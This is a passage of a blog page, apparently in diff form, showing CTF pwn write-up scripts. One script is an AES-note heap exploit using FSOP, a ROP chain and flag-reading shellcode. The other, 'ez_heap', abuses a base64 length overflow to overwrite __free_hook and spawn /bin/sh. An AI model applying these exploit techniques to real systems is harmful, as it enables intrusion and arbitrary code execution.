bytes).&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 填充数据以确保其长度是16的倍数</span></span><br><span class="line">    data = pad(data, <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 创建AES ECB模式的加密对象</span></span><br><span class="line">    cipher = AES.new(key, AES.MODE_ECB)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 加密数据</span></span><br><span class="line">    encrypted_data = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(data), <span class="number">16</span>):</span><br><span class="line">        encrypted_data += cipher.encrypt(data[i : i + <span class="number">16</span>])</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> encrypted_data</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">encrypted_data, key</span>):</span><br><span class="line">    <span class="comment"># 确保密钥长度为128位（16字节）</span></span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">len</span>(key) == <span class="number">16</span>, <span class="string">&quot;Key must be 128 bits (16 bytes).&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 创建AES ECB模式的解密对象</span></span><br><span class="line">    cipher = AES.new(key, AES.MODE_ECB)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 解密数据</span></span><br><span class="line">    decrypted_data = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(encrypted_data), <span class="number">16</span>):</span><br><span class="line">        decrypted_data += cipher.decrypt(encrypted_data[i : i + <span class="number">16</span>])</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 移除填充</span></span><br><span class="line">    <span class="comment"># decrypted_data = unpad(decrypted_data, 16)</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> decrypted_data</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>, <span class="string">b&#x27;A&#x27;</span> * <span class="number">0x10</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">ru(<span class="string">b&#x27;A&#x27;</span> * <span class="number">0x10</span>)</span><br><span class="line">code_base = u64_ex(r(<span class="number">6</span>)) - <span class="number">0x1BF0</span></span><br><span class="line">set_current_code_base_and_log(code_base)</span><br><span class="line"></span><br><span class="line">add(<span class="number">1</span>, <span class="string">b&#x27;A&#x27;</span> * <span class="number">0x10</span>)</span><br><span class="line">dele(<span class="number">1</span>)</span><br><span class="line">edit(<span class="number">1</span>, <span class="string">b&#x27;A&#x27;</span> * <span class="number">0x10</span>)</span><br><span class="line">dele(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">ru(<span class="string">b&#x27;: &#x27;</span>)</span><br><span class="line">data = r(<span class="number">0x10</span>)</span><br><span class="line">log_ex(data)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">1</span>, <span class="string">b&#x27;A&#x27;</span> * <span class="number">0x10</span>)</span><br><span class="line">dele(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">2</span>, <span class="string">b&#x27;\xa0&#x27;</span>)</span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">3</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">add(<span class="number">2</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">add(<span class="number">0</span>, <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x10</span>)</span><br><span class="line">key = <span class="string">b&#x27;\x51\x88\xc6\x47\x4b\x22\x8c\xbd\xd2\x42\xe9\x12\x5e\xbe\x1d\x53&#x27;</span></span><br><span class="line">log_ex(<span class="string">f&quot;key: <span class="subst">&#123;key&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">ru(<span class="string">b&#x27;: &#x27;</span>)</span><br><span class="line">data = r(<span class="number">0x10</span>)</span><br><span class="line">heap_base = u64_ex(encrypt(data, key)[:<span class="number">8</span>]) - <span class="number">0x200</span></span><br><span class="line">log_heap_base_addr(heap_base)</span><br><span class="line"></span><br><span class="line">dele(<span class="number">3</span>)</span><br><span class="line">edit(<span class="number">3</span>, decrypt(<span class="string">b&#x27;\x00&#x27;</span> * <span class="number">0x10</span>, key))</span><br><span class="line">dele(<span class="number">3</span>)</span><br><span class="line">edit(<span class="number">3</span>, p64_ex(heap_base + <span class="number">0x330</span>))</span><br><span class="line">add(<span class="number">3</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">add(<span class="number">4</span>, decrypt(p64_ex(<span class="number">0</span>) + p64_ex(<span class="number">0x20CD1</span>), key))  <span class="comment"># any</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">5</span>, <span class="string">b&#x27;\x00&#x27;</span> * <span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x8</span>):</span><br><span class="line">    add(<span class="number">15</span> - i, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x13</span> - <span class="number">0x8</span>):</span><br><span class="line">    add(<span class="number">6</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">6</span>, decrypt(p64_ex(<span class="number">0</span>) + p64_ex(<span class="number">0x31</span>), key))</span><br><span class="line"></span><br><span class="line">edit(<span class="number">4</span>, decrypt(p64_ex(<span class="number">0</span>) + p64_ex(<span class="number">0x511</span>), key))</span><br><span class="line">dele(<span class="number">5</span>)</span><br><span class="line">show(<span class="number">5</span>)</span><br><span class="line">ru(<span class="string">b&#x27;: &#x27;</span>)</span><br><span class="line">data = r(<span class="number">0x10</span>)</span><br><span class="line">libc_base = u64_ex(encrypt(data, key)[:<span class="number">8</span>]) - <span class="number">0x1ECBE0</span></span><br><span class="line">set_current_libc_base_and_log(libc_base)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">4</span>, decrypt(p64_ex(<span class="number">0</span>) + p64_ex(<span class="number">0x41</span>), key))</span><br><span class="line"></span><br><span class="line">dele(<span class="number">15</span>)</span><br><span class="line">edit(<span class="number">15</span>, decrypt(p64_ex(<span class="number">0</span>) * <span class="number">2</span>, key))</span><br><span class="line">dele(<span class="number">14</span>)</span><br><span class="line">edit(<span class="number">14</span>, decrypt(p64_ex(heap_base + <span class="number">0x10</span>) * <span class="number">2</span>, key))</span><br><span class="line">add(<span class="number">14</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">add(<span class="number">0</span>, p64_ex(<span class="number">0</span>))</span><br><span class="line"></span><br><span class="line">dele(<span class="number">15</span>)</span><br><span class="line">edit(<span class="number">15</span>, decrypt(p64_ex(<span class="number">0</span>) * <span class="number">2</span>, key))</span><br><span class="line">dele(<span class="number">14</span>)</span><br><span class="line">edit(<span class="number">14</span>, decrypt(p64_ex(heap_base + <span class="number">0x10</span> + <span class="number">0xA0</span>) * <span class="number">2</span>, key))</span><br><span class="line">add(<span class="number">14</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">add(<span class="number">1</span>, p64_ex(<span class="number">0</span>))</span><br><span class="line"></span><br><span class="line">dele(<span class="number">15</span>)</span><br><span class="line">edit(<span class="number">15</span>, decrypt(p64_ex(<span class="number">0</span>) * <span class="number">2</span>, key))</span><br><span class="line">dele(<span class="number">14</span>)</span><br><span class="line">edit(<span class="number">14</span>, decrypt(p64_ex(heap_base + <span class="number">0x10</span> + <span class="number">0xA0</span> + <span class="number">0x30</span>) * <span class="number">2</span>, key))</span><br><span class="line">add(<span class="number">14</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">add(<span class="number">2</span>, p64_ex(<span class="number">0</span>))</span><br><span class="line"></span><br><span class="line">dele(<span class="number">15</span>)</span><br><span class="line">edit(<span class="number">15</span>, decrypt(p64_ex(<span class="number">0</span>) * <span class="number">2</span>, key))</span><br><span class="line">dele(<span class="number">14</span>)</span><br><span class="line">edit(<span class="number">14</span>, decrypt(p64_ex(heap_base + <span class="number">0x300</span>) * <span class="number">2</span>, key))</span><br><span class="line">add(<span class="number">14</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">add(<span class="number">3</span>, p64_ex(<span class="number">0</span>))</span><br><span class="line"></span><br><span class="line">dele(<span class="number">15</span>)</span><br><span class="line">edit(<span class="number">15</span>, decrypt(p64_ex(<span class="number">0</span>) * <span class="number">2</span>, key))</span><br><span class="line">dele(<span class="number">14</span>)</span><br><span class="line">edit(<span class="number">14</span>, decrypt(p64_ex(heap_base + <span class="number">0x300</span> + <span class="number">0x30</span>) * <span class="number">2</span>, key))</span><br><span class="line">add(<span class="number">14</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">add(<span class="number">4</span>, p64_ex(<span class="number">0</span>))</span><br><span class="line"></span><br><span class="line">dele(<span class="number">15</span>)</span><br><span class="line">edit(<span class="number">15</span>, decrypt(p64_ex(<span class="number">0</span>) * <span class="number">2</span>, key))</span><br><span class="line">dele(<span class="number">14</span>)</span><br><span class="line">edit(<span class="number">14</span>, decrypt(p64_ex(heap_base + <span class="number">0x300</span> + <span class="number">0x60</span>) * <span class="number">2</span>, key))</span><br><span class="line">add(<span class="number">14</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">add(<span class="number">5</span>, p64_ex(<span class="number">0</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x7</span>):</span><br><span class="line">    dele(<span class="number">15</span>)</span><br><span class="line">    edit(<span class="number">15</span>, decrypt(p64_ex(<span class="number">0</span>) * <span class="number">2</span>, key))</span><br><span class="line"></span><br><span class="line">dele(<span class="number">15</span>)</span><br><span class="line">dele(<span class="number">14</span>)</span><br><span class="line">edit(<span class="number">14</span>, p64_ex(libc.sym._IO_list_all - <span class="number">0x18</span>))</span><br><span class="line">edit(<span class="number">15</span>, p64_ex(heap_base + <span class="number">0x380</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    add(<span class="number">15</span>, p64_ex(heap_base + <span class="number">0x380</span>))</span><br><span class="line"></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">15</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">fake_IO_FILE = heap_base + <span class="number">0x10</span></span><br><span class="line">_IO_wfile_jumps = libc.sym._IO_wfile_jumps</span><br><span class="line"></span><br><span class="line">payload = flat(</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="number">0x0</span>: u64_ex(<span class="string">&quot;  sh&quot;</span>),</span><br><span class="line">        <span class="number">0x8</span>: libc_base + <span class="number">0x000000000002F70A</span>,  <span class="comment">#: pop rsp; ret;</span></span><br><span class="line">        <span class="number">0x10</span>: heap_base + <span class="number">0x300</span>,</span><br><span class="line">        <span class="number">0x28</span>: <span class="number">0xB81</span>,  <span class="comment"># _IO_write_ptr</span></span><br><span class="line">        <span class="number">0xA0</span>: fake_IO_FILE + <span class="number">0xE8</span> - <span class="number">0xE0</span>,  <span class="comment"># _wide_data-&gt;_wide_vtable</span></span><br><span class="line">        <span class="number">0xD8</span>: _IO_wfile_jumps,  <span class="comment"># vtable</span></span><br><span class="line">        <span class="number">0xE0</span>: libc_base + <span class="number">0x5B4D0</span>,  <span class="comment"># function</span></span><br><span class="line">        <span class="number">0xE8</span>: fake_IO_FILE + <span class="number">0xE0</span> - <span class="number">0x68</span>,  <span class="comment"># _wide_data-&gt;_wide_vtable-&gt;doallocate</span></span><br><span class="line">    &#125;,</span><br><span class="line">    filler=<span class="string">b&#x27;\x00&#x27;</span>,</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>, decrypt(payload[:<span class="number">0x30</span>], key))</span><br><span class="line">edit(<span class="number">1</span>, decrypt(payload[<span class="number">0xA0</span> : <span class="number">0xA0</span> + <span class="number">0x30</span>], key))</span><br><span class="line">edit(<span class="number">2</span>, decrypt(payload[<span class="number">0xA0</span> + <span class="number">0x30</span> : <span class="number">0xA0</span> + <span class="number">0x60</span>], key))</span><br><span class="line"></span><br><span class="line">CG.set_find_area(<span class="literal">False</span>, <span class="literal">True</span>)</span><br><span class="line">rdi = CG.pop_rdi_ret()</span><br><span class="line">rsi = CG.pop_rsi_ret()</span><br><span class="line">rdx_rbx = CG.pop_rdx_rbx_ret()</span><br><span class="line"></span><br><span class="line">payload = flat([rdi, heap_base, rsi, <span class="number">0x2000</span>, rdx_rbx, <span class="number">7</span>, <span class="number">0</span>, libc.sym.mprotect, heap_base + <span class="number">0x360</span>]).ljust(<span class="number">0x60</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += asm(shellcraft.read(<span class="number">0</span>, heap_base + <span class="number">0x360</span>, <span class="number">0x1000</span>))</span><br><span class="line">payload = pad(payload, <span class="number">16</span>)</span><br><span class="line">edit(<span class="number">3</span>, decrypt(payload[:<span class="number">0x30</span>], key))</span><br><span class="line">edit(<span class="number">4</span>, decrypt(payload[<span class="number">0x30</span> : <span class="number">0x30</span> + <span class="number">0x30</span>], key))</span><br><span class="line">edit(<span class="number">5</span>, decrypt(payload[<span class="number">0x30</span> + <span class="number">0x30</span> : <span class="number">0x30</span> + <span class="number">0x60</span>], key))</span><br><span class="line"></span><br><span class="line">launch_gdb(cmd)</span><br><span class="line">sla(input_after_this, <span class="string">b&#x27;5&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">s(<span class="string">b&#x27;\x90&#x27;</span> * <span class="number">0x30</span> + ShellcodeMall.amd64.cat_flag)</span><br><span class="line"></span><br><span class="line">ia()</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
 
 <h2 id="ez-heap"><a href="#ez-heap" class="headerlink" title="ez_heap"></a>ez_heap</h2><p>base64 解码计算长度错误导致的溢出</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> pwncli <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode, b64encode</span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">&quot;tmux&quot;</span>, <span class="string">&quot;splitw&quot;</span>, <span class="string">&quot;-h&quot;</span>, <span class="string">&quot;-l&quot;</span>, <span class="string">&quot;122&quot;</span>]</span><br><span class="line">local_flag = sys.argv[<span class="number">1</span>] <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) == <span class="number">2</span> <span class="keyword">else</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local_flag == <span class="string">&quot;remote&quot;</span>:</span><br><span class="line">    addr = <span class="string">&#x27;47.94.85.95 32827&#x27;</span></span><br><span class="line">    host = addr.split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">    gift.io = remote(host[<span class="number">0</span>], host[<span class="number">1</span>])</span><br><span class="line">    gift.remote = <span class="literal">True</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    gift.io = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> local_flag == <span class="string">&quot;nodbg&quot;</span>:</span><br><span class="line">        gift.remote = <span class="literal">True</span></span><br><span class="line">init_x64_context(gift.io, gift)</span><br><span class="line">libc = load_libc()</span><br><span class="line">gift.elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">cmd = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    b *$rebase(0x1BA7)</span></span><br><span class="line"><span class="string">    b *$rebase(0x1D1D)</span></span><br><span class="line"><span class="string">    b *$rebase(0x1EF1)</span></span><br><span class="line"><span class="string">    b *$rebase(0x1FA0)</span></span><br><span class="line"><span class="string">    b *$rebase(0x205B)</span></span><br><span class="line"><span class="string">    b *$rebase(0x20FA)</span></span><br><span class="line"><span class="string">    set $decode = $rebase(0x5060)</span></span><br><span class="line"><span class="string">    c</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">input_after_this = <span class="string">b&#x27;Enter your choice:&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add_en</span>(<span class="params">data</span>):</span><br><span class="line">    sla(input_after_this, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    sa(<span class="string">b&#x27;text&#x27;</span>, data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add_de</span>(<span class="params">data</span>):</span><br><span class="line">    sla(input_after_this, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    sa(<span class="string">b&#x27;text&#x27;</span>, data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dele_en</span>(<span class="params">idx</span>):</span><br><span class="line">    sla(input_after_this, <span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;idx&#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dele_de</span>(<span class="params">idx</span>):</span><br><span class="line">    sla(input_after_this, <span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;idx&#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show_en</span>(<span class="params">idx</span>):</span><br><span class="line">    sla(input_after_this, <span class="string">b&#x27;5&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;idx&#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show_de</span>(<span class="params">idx</span>):</span><br><span class="line">    sla(input_after_this, <span class="string">b&#x27;6&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;idx&#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add_de(b64encode(<span class="string">b&#x27;a&#x27;</span> * <span class="number">0x36</span>))  <span class="comment"># 0x36</span></span><br><span class="line">add_de(b64encode(<span class="string">b&#x27;c&#x27;</span> * <span class="number">0x24</span>))</span><br><span class="line">add_de(b64encode(<span class="string">b&#x27;b&#x27;</span> * <span class="number">0x36</span>))</span><br><span class="line">add_en(<span class="string">b&#x27;a&#x27;</span> * <span class="number">0x400</span>)</span><br><span class="line">add_de(b64encode(<span class="string">b&#x27;b&#x27;</span> * <span class="number">0x36</span>))</span><br><span class="line">dele_en(<span class="number">0</span>)</span><br><span class="line">dele_de(<span class="number">0</span>)</span><br><span class="line">add_de(b64encode(<span class="string">b&#x27;\x00&#x27;</span> * <span class="number">0x39</span>)[:-<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">dele_de(<span class="number">3</span>)</span><br><span class="line">dele_de(<span class="number">2</span>)</span><br><span class="line">dele_de(<span class="number">1</span>)</span><br><span class="line">add_de(b64encode(<span class="string">b&#x27;a&#x27;</span> * <span class="number">0x39</span>)[:-<span class="number">1</span>])</span><br><span class="line">show_de(<span class="number">1</span>)</span><br><span class="line">ru(<span class="string">b&#x27;a&#x27;</span> * <span class="number">0x38</span>)</span><br><span class="line">heap_base = u64_ex(ru(<span class="string">b&#x27;\n&#x27;</span>, drop=<span class="literal">True</span>)) - <span class="number">0x81</span></span><br><span class="line">log_heap_base_addr(heap_base)</span><br><span class="line"></span><br><span class="line">dele_de(<span class="number">1</span>)</span><br><span class="line">add_de(b64encode(<span class="string">b&#x27;\x00&#x27;</span> * <span class="number">0x28</span> + p64_ex(<span class="number">0x21</span>) + p64_ex(heap_base + <span class="number">0x320</span>))[:-<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">add_de(b64encode(<span class="string">b&#x27;a&#x27;</span> * <span class="number">0x36</span>))</span><br><span class="line">add_de(b64encode(<span class="string">b&#x27;a&#x27;</span> * <span class="number">0x30</span>))</span><br><span class="line">show_de(<span class="number">3</span>)</span><br><span class="line">libc_base = u64_ex(ru(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:]) - <span class="number">0x1ECBE0</span></span><br><span class="line">set_current_libc_base_and_log(libc_base)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">dele_de(<span class="number">2</span>)</span><br><span class="line">add_de(b64encode(p64_ex(<span class="number">0</span>) + p64_ex(<span class="number">0x21</span>)))</span><br><span class="line">dele_de(<span class="number">3</span>)</span><br><span class="line">dele_de(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">dele_de(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">add_de(b64encode(p64_ex(<span class="number">0</span>) * <span class="number">6</span> + p64_ex(libc.sym.__free_hook))[:-<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">add_de(b64encode(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>))</span><br><span class="line">add_de(b64encode(p64_ex(libc.sym.system)))</span><br><span class="line"></span><br><span class="line">launch_gdb(cmd)</span><br><span class="line">dele_de(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ia()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> pwncli <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode, b64encode</span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">&quot;tmux&quot;</span>, <span class="string">&quot;splitw&quot;</span>, <span class="string">&quot;-h&quot;</span>, <span class="string">&quot;-l&quot;</span>, <span class="string">&quot;122&quot;</span>]</span><br><span class="line">local_flag = sys.argv[<span class="number">1</span>] <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) == <span class="number">2</span> <span class="keyword">else</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local_flag == <span class="string">&quot;remote&quot;</span>:</span><br><span class="line">    addr = <span class="string">&#x27;47.94.85.95 32827&#x27;</span></span><br><span class="line">    host = addr.split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">    gift.io = remote(host[<span class="number">0</span>], host[<span class="number">1</span>])</span><br><span class="line">    gift.remote = <span class="literal">True</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    gift.io = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> local_flag == <span class="string">&quot;nodbg&quot;</span>:</span><br><span class="line">        gift.remote = <span class="literal">True</span></span><br><span class="line">init_x64_context(gift.io, gift)</span><br><span class="line">libc = load_libc()</span><br><span class="line">gift.elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">cmd = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    b *$rebase(0x1BA7)</span></span><br><span class="line"><span class="string">    b *$rebase(0x1D1D)</span></span><br><span class="line"><span class="string">    b *$rebase(0x1EF1)</span></span><br><span class="line"><span class="string">    b *$rebase(0x1FA0)</span></span><br><span class="line"><span class="string">    b *$rebase(0x205B)</span></span><br><span class="line"><span class="string">    b *$rebase(0x20FA)</span></span><br><span class="line"><span class="string">    set $decode = $rebase(0x5060)</span></span><br><span class="line"><span class="string">    c</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">input_after_this = <span class="string">b&#x27;Enter your choice:&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add_en</span>(<span class="params">data</span>):</span><br><span class="line">    sla(input_after_this, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    sa(<span class="string">b&#x27;text&#x27;</span>, data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add_de</span>(<span class="params">data</span>):</span><br><span class="line">    sla(input_after_this, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    sa(<span 